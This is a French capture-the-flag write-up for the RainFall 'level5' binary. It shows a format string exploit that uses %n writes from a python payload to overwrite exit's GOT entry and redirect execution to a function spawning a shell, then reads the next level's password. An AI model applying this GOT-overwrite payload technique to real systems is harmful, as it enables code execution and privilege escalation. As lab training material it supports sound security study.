@@ -1,0 +1,60 @@
+Ce niveau se base aussi sur une vulnerabilite format string qu'on va exploiter en reecrivant l'adresse de exit appellee apres printf dans la fonction n, pour la rediriger vers la fonction o qui appelle system bin sh.
+
+level5@RainFall:~$ objdump -t ./level5
+
+./level5:     file format elf32-i386
+
+SYMBOL TABLE:
+	...
+	080484a4 g     F .text	0000001e              o
+	...
+
+(gdb)
+0x080484ff in n ()
+1: x/5i $pc
+=> 0x80484ff <n+61>:	call   0x80483d0 <exit@plt>
+   0x8048504 <main>:	push   ebp
+   0x8048505 <main+1>:	mov    ebp,esp
+   0x8048507 <main+3>:	and    esp,0xfffffff0
+   0x804850a <main+6>:	call   0x80484c2 <n>
+(gdb) si
+0x080483d0 in exit@plt ()
+1: x/5i $pc
+=> 0x80483d0 <exit@plt>:	jmp    DWORD PTR ds:0x8049838
+   0x80483d6 <exit@plt+6>:	push   0x28
+   0x80483db <exit@plt+11>:	jmp    0x8048370
+
+Pour se faire, rien de bien different que les niveau precedent, sauf qu'il faut ecrire l'adresse en deux temps, contrainte de %n.
+Commencons par chercher la place de notre adresse dans la stack apres son envoi dans printf.
+
+level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "%x " * 5)' | ./level5
+8200 b7fd1ac0 b7ff37d0 8049838 25207825
+
+Elle se trouve en 4eme position.
+Pour l'ecrire en deux temps, il faut d'abord viser la partie basse puis la haute.
+
+level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%x " * 5)' | ./level5
+8:200 b7fd1ac0 b7ff37d0 8049838 804983a
+
+Il faut sauter a l'adresse de la fonction o 0x080484a4, qui divise en deux donne:
+0x84a4 - 8 (- 8 pour le nombre de charactere ecrit par l'adresse de exit) == 33948
+>>> 0x0804 - 0x84a4
+-31904
+Afin d'obtenir un entier positif il faut rajouter un 1 devant la premiere adresse
+>>> 0x10804 - 0x84a4
+33632
+Nous allons donc ecrire ces deux valeur dans les deux partie de l'adresse destination:
+
+level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948c" + "%4$n" + "%33632c" + "%5$n")' > /tmp/test2
+level5@RainFall:~$ xxd /tmp/test2
+0000000: 3898 0408 3a98 0408 2533 3339 3438 6325  8...:...%33948c%
+0000010: 3424 6e25 3333 3633 3263 2535 246e 0a    4$n%33632c%5$n.
+
+level5@RainFall:~$ cat /tmp/test - | ./level5
+8:
+	...
+	            �
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
